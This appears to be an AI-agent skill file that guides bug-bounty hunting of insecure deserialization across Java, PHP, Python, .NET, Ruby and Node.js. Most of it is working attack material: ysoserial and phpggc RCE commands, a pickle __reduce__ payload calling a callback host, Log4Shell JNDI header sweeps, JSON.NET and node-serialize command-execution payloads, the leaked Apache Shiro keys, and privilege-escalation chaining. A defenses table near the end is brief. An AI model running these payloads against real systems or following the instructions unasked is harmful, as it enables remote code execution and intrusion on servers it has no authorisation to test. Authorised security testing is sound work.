---
name: hunt-deserialization
description: Hunt Insecure Deserialization — Java gadget chains (ysoserial), PHP object injection (phpggc), Python pickle RCE, .NET BinaryFormatter, Ruby Marshal.load, JNDI/Log4Shell. RCE via deserialization is almost always Critical. Use when target runs Java, PHP serialization, Python pickle, .NET, or Ruby on Rails.
sources: hackerone_public
report_count: 22
---

# HUNT-DESERIALIZATION — Insecure Deserialization

## Crown Jewel Targets

Deserialization bugs are almost always Critical — they lead directly to RCE without prerequisite conditions.

**Highest-value chains:**
- **Java ysoserial gadget chains** — CommonsCollections, Spring, JNDI, Groovy gadgets → full OS command execution
- **PHP Object Injection** — `__wakeup` / `__destruct` magic methods → file write / RCE
- **Python pickle** — `pickle.loads(attacker_data)` → `__reduce__` → `os.system('id')`
- **.NET BinaryFormatter** — TypeConfuseDelegate gadget chain → RCE
- **Ruby Marshal.load** — Gem::Requirement, Gem::Installer gadgets → RCE
- **JNDI injection** — Log4Shell pattern: `${jndi:ldap://attacker/a}` → class load → RCE

---

## Attack Surface Signals

### Detection Patterns
```bash
# Java serialized objects start with AC ED 00 05 (hex) or rO0A (base64)
echo "rO0ABXQ=" | base64 -d | xxd | head -1  # shows: ac ed 00 05

# PHP serialization: O:8:"stdClass":0:{}
# Python pickle: starts with \x80\x04 (protocol 4) or \x80\x02

# Apache Shiro: rememberMe cookie present
curl -sI https://$TARGET/ | grep -i "Set-Cookie.*rememberMe"

# Log4j: test user-controlled fields for JNDI interpolation
curl -H 'User-Agent: ${jndi:dns://COLLAB_HOST/a}' https://$TARGET/
```

### Header / Cookie Signals
```
Content-Type: application/x-java-serialized-object
Cookie containing rO0= prefix (Java base64 serialized)
Cookie: rememberMe= (Apache Shiro)
Cookie: _VIEWSTATE (ASP.NET ViewState without encryption)
Endpoints: /remoting/, /invoker/, /jmx-console/, /wls-wsat/
```

### Traffic Fingerprinting Quick Reference

| Language | Hex Signature | Base64 Prefix | Key Sinks |
|----------|--------------|---------------|-----------|
| **Java** | `ac ed 00 05` | `rO0AB` | `ObjectInputStream.readObject()`, Shiro `rememberMe`, T3/IIOP |
| **PHP** | `O:N:"ClassName"` pattern | — | `unserialize()`, `phar://` URI on any file op |
| **Python** | `80 03` / `80 04` (protocol 3/4) | — | `pickle.loads()`, `yaml.load()` (unsafe), `jsonpickle.decode()` |
| **.NET** | `00 01 00 00 00` (BinaryFormatter), `FF 01` (ViewState) | `AAEAAAD` | `BinaryFormatter.Deserialize()`, `LosFormatter`, `JSON.NET` with `$type` |
| **Ruby** | `04 08` (Marshal header) | — | `Marshal.load()`, `YAML.load()` (not safe_load) |
| **Node.js** | `_$$ND_FUNC$$_` (node-serialize) | — | `node-serialize.unserialize()`, `funcster.deserialize()` |

---

## Step-by-Step Hunting Methodology

### Phase 1 — Java Deserialization (ysoserial)
```bash
# Install ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Generate OOB detection payload
java -jar ysoserial-all.jar CommonsCollections6 \
  'curl http://COLLAB_HOST/ysoserial' | base64 -w0

# Send as body or cookie
java -jar ysoserial-all.jar CommonsCollections6 'id > /tmp/pwned' | base64 | \
  curl -s https://$TARGET/wls-wsat/CoordinatorPortType \
    -H "Content-Type: application/x-java-serialized-object" \
    --data-binary @-

# Apache Shiro exploit (default AES key)
python3 shiro_exploit.py -u https://$TARGET/ -c "id"

# Shiro known hard-coded keys (SHIRO-550 / CVE-2016-4437):
# kPH+bIxk5D2deZiIxcaaaA== (most common), wGJlpLanyXlVB1LUUWolBg==,
# 4AvVhmFLUs0KTA3Kprsdag==, Z3VucwAAAAAAAAAAAAAAAA==

# WebLogic T3 probe (port 7001) + XMLDecoder (CVE-2017-10271 on /wls-wsat/)
# RMI Registry (port 1099): ysoserial.exploit.RMIRegistryExploit
```

### JDK Version Constraints

| JDK Version | Impact |
|---|---|
| < 8u121 | RMI/LDAP remote class loading works |
| 8u121–8u190 | `trustURLCodebase=false` for RMI; LDAP still works |
| >= 8u191 | Both RMI and LDAP remote class loading blocked |
| >= 8u191 bypass | Use LDAP → return serialized gadget object (not remote class) |

### Phase 2 — PHP Object Injection
```bash
# Find unserialize() calls in source
grep -r "unserialize(" --include="*.php" .

# Inject test: O:8:"stdClass":1:{s:4:"test";s:5:"value";}
# Send in cookie, POST param, or hidden form field
# If error changes → deserialization confirmed

# Craft gadget chain using phpggc
git clone https://github.com/ambionics/phpggc
php phpggc -l  # list chains
php phpggc Laravel/RCE5 system id | base64
```

### Phar Deserialization (PHP)

Phar archives contain serialized metadata. Any file operation on a `phar://` URI triggers deserialization — even when `unserialize()` is never directly called. Triggering functions include: `file_exists()`, `file_get_contents()`, `fopen()`, `is_file()`, `is_dir()`, `copy()`, `filesize()`, `include()`, `require()`, `getimagesize()`.

```bash
# Generate phar with PHPGGC:
phpggc -p phar -o exploit.phar Monolog/RCE1 system id

# Attack flow: upload a polyglot JPEG+PHAR → trigger file_exists("phar://uploads/avatar.jpg")
```

### phpMyAdmin Configuration Injection (Real-World)

`PMA_Config` class reads arbitrary files via `source` property:
```
action=test&configuration=O:10:"PMA_Config":1:{s:6:"source";s:11:"/etc/passwd";}
```

### Phase 3 — Python Pickle
```bash
# Generate OOB payload
python3 -c "
import pickle, os, base64
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://COLLAB_HOST/pickle-rce',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
"

# Send as cookie or POST body
curl -s https://$TARGET/api/load-model \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.pkl
```

### Phase 4 — .NET ViewState
```bash
# Check if ViewState is unsigned (MAC disabled)
# Look for __VIEWSTATE in HTML source without __VIEWSTATEMAC

# YSoSerial.Net
dotnet YSoSerial.exe -f BinaryFormatter -g TypeConfuseDelegate \
  -c "cmd /c curl http://COLLAB_HOST/viewstate-rce" -o base64
```

### Phase 5 — Log4Shell / JNDI
```bash
# Test all user-controlled inputs
COLLAB="COLLAB_HOST"
for HEADER in "User-Agent" "X-Forwarded-For" "Referer" "X-Api-Version" "Accept-Language"; do
  curl -s https://$TARGET/ -H "$HEADER: \${jndi:dns://$COLLAB/$HEADER}" &
done

# Test POST body fields
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"\${jndi:ldap://$COLLAB/a}\"}"
```

### Phase 6 — Ruby Deserialization

```bash
# Marshal.load — fingerprint: binary starting with \x04\x08
grep -r "Marshal.load\|Marshal.restore" --include="*.rb" .

# Gem::Requirement gadget chain via marshalable objects
# Use ruby-advisory-db gadgets
```

**Ruby YAML.load (Critical)**: `YAML.load` (not `YAML.safe_load`) deserializes arbitrary Ruby objects.

- **Ruby ≤ 2.7.2**: `Gem::Requirement` chain with `git_set: id`:
```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
    - !ruby/object:Gem::StubSpecification
      loaded_from: "|id"
```
- **Ruby 2.x–3.x**: `Gem::Installer` → `TarReader` → `Kernel#system` chain (longer, multi-step).
- Always test: `YAML.load("--- !ruby/object:Gem::Installer\ni: x")` for class instantiation.

### Phase 7 — .NET Deserialization

```bash
# BinaryFormatter — fingerprint: hex 00 01 00 00 00 / base64 AAEAAAD
# ViewState — fingerprint: hex FF 01 / base64 /w prefix
# JSON.NET — fingerprint: $type property in JSON

# ysoserial.net payload generation:
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c whoami" -o base64
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "cmd /c whoami"
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" \
  --validationalg="SHA1" --validationkey="KNOWN_KEY"
```

**JSON.NET $type abuse** (vulnerable when `TypeNameHandling != None`):
```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList","$values":["cmd","/c calc"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}
```

**ViewState without MAC**: leak `machineKey` from `web.config` (via LFI/backup) → forge ViewState with ysoserial.net.

### Phase 8 — Node.js Deserialization

**node-serialize** IIFE injection:
```javascript
// _$$ND_FUNC$$_ marker + trailing () = immediate execution on unserialize
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o,s){});}()"}
```

**funcster** constructor chain:
```javascript
{"__js_function":"function(){var net=this.constructor.constructor('return require')()('child_process');return net.execSync('id').toString()}"}
```

---

## Chain Table

| Deserialization signal | Chain to | Impact |
|-----------------------|----------|--------|
| Any deser RCE | /etc/passwd + id output | Prove arbitrary command execution |
| RCE as low-privilege user | Find SUID binaries / sudo rules | Privilege escalation → root |
| Blind RCE (OOB callback) | DNS callback → confirm exec | Sufficient for Critical PoC |
| Log4Shell | LDAP → JNDI → class load | Full RCE on JVM process |

---

## Automation
```bash
# OOB listener
interactsh-client -v -n 5

# JNDI exploit kit
git clone https://github.com/pimps/JNDI-Exploit-Kit
```

---

## Validation

✅ DNS/HTTP callback from COLLAB host: blind deserialization confirmed
✅ Command output in response: full RCE confirmed

**Severity:** Almost always **Critical** — RCE with server process privileges.

## Defenses

| Language | Mitigation |
|---|---|
| **Java** | JEP 290 deserialization filters; whitelist allowed classes; avoid `ObjectInputStream` on untrusted data; use JSON/Protobuf |
| **PHP** | Avoid `unserialize()` on user input; use `json_decode()`; block `phar://` in file operations |
| **Python** | Use `pickle` only for trusted data; use `json` for external input; PyYAML: always `yaml.safe_load()` |
| **.NET** | Avoid `BinaryFormatter`; set `TypeNameHandling = None`; use `DataContractSerializer` with known types |
| **Ruby** | Use `YAML.safe_load` / `Psych.safe_load`; avoid `Marshal.load` on untrusted data |
| **Node.js** | Avoid `node-serialize`; use `JSON.parse()` only; never deserialize functions |

## Related Skills

- **`hunt-rce`** — Deserialization is the canonical server-side RCE path. Chain primitive: Java ysoserial gadget chain (CommonsCollections6) → OS command execution as the application server user → `id` / `whoami` in response or OOB callback.
- **`hunt-aspnet`** — ASP.NET ViewState deserialization is a .NET-specific RCE class. Chain primitive: `__VIEWSTATEENCRYPTED=""` (signed-only) + leaked `<machineKey>` validationKey → `ysoserial.net -p ViewState -g TypeConfuseDelegate` → RCE as IIS worker process.
- **`hunt-lfi`** — PHP `phar://` deserialization chains file upload with PHP object injection. Chain primitive: upload a polyglot JPEG + PHAR file → include it via `phar:///path/to/upload.jpg` → `__wakeup`/`__destruct` magic methods called → RCE via PHP gadget chain.
- **`hunt-xxe`** — XML external entity processing often pairs with XML deserialization sinks. Chain primitive: SOAP endpoint accepts XML → XXE exfiltrates `/etc/passwd` via OOB DTD → combined with Java deserialization if the XML parser uses XStream or similar.
- **`hunt-api-misconfig`** — JWT `alg:none` or weak HMAC secret is a deserialization-equivalent — the server deserializes the token payload without verifying integrity. Chain primitive: `{"alg":"none","typ":"JWT"}.{"sub":"admin","role":"admin"}.` → server accepts forged JWT payload as deserialized identity.
- **`security-arsenal`** — Reach for the Deserialization Payload Tree: ysoserial Java gadget chains (CommonsCollections, Spring, JNDI, Groovy, ROME), ysoserial.net (.NET BinaryFormatter, ViewState, ObjectStateFormatter), PHPGGC (Laravel, CodeIgniter, Zend), Python pickle `__reduce__`, Ruby Marshal `Gem::Installer`, and the JNDI/Log4Shell chain.
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical. A Java serialized object header (`AC ED 00 05` / `rO0ABX`) in a cookie does NOT confirm the application deserializes it — confirm by sending a crafted ysoserial payload with an OOB callback. Deserialization found = Critical, but deserialization *confirmed* = the higher value.
